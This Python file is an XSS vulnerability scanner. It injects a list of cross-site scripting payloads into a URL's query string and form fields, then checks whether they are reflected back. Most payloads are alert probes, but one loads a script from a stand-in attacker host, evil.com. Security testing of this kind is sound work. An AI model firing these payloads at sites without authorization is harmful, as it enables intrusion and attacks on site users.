import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# 🛡️ Advanced XSS payloads for better real-world detection
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<img src=x onerror=confirm(1)>",
    "<script>prompt(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>click</a>",
    "';alert(String.fromCharCode(88,83,83));//",
    "jaVaSCript:/*--><svg/onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<img src=1 href=1 onerror=alert(document.domain)>",
    "<base href=//evil.com/><script src=1.js></script>",
]

def find_forms(url):
    """Extract all forms from a given page."""
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception:
        return []

def get_form_details(form):
    """Extract form action, method, and input fields."""
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }

    for tag in form.find_all(["input", "textarea", "select"]):
        name = tag.attrs.get("name")
        if not name:
            continue
        type_ = tag.attrs.get("type", "text")
        value = tag.attrs.get("value", "")
        details["inputs"].append({"name": name, "type": type_, "value": value})

    return details

def submit_form(form_details, url, payload):
    """Submit the form with a payload and return the response."""
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] in ["text", "search", "textarea"]:
            data[input["name"]] = payload
        else:
            data[input["name"]] = input["value"]

    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10)
        else:
            return requests.get(target_url, params=data, timeout=10)
    except Exception:
        return None

def scan_xss(url):
    """Main function to scan a given URL for XSS vulnerabilities."""
    results = {
        "url": url,
        "vulnerable": False,
        "payloads": [],
        "reflected": [],
        "details": []
    }

    # 🔍 1. Test direct URL-based XSS
    for payload in XSS_PAYLOADS:
        test_url = f"{url}?xss_test={payload}"
        try:
            res = requests.get(test_url, timeout=10)
            if payload.lower() in res.text.lower():
                results["vulnerable"] = True
                results["payloads"].append(payload)
                results["reflected"].append(test_url)
                results["details"].append({
                    "type": "url",
                    "payload": payload,
                    "reflected_url": test_url
                })
        except Exception:
            continue

    # 🧪 2. Test XSS via all form fields (GET + POST)
    forms = find_forms(url)
    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and payload.lower() in response.text.lower():
                results["vulnerable"] = True
                results["payloads"].append(payload)
                results["reflected"].append(urljoin(url, details["action"]))
                results["details"].append({
                    "type": "form",
                    "form_action": details["action"],
                    "method": details["method"],
                    "payload": payload
                })

    return results
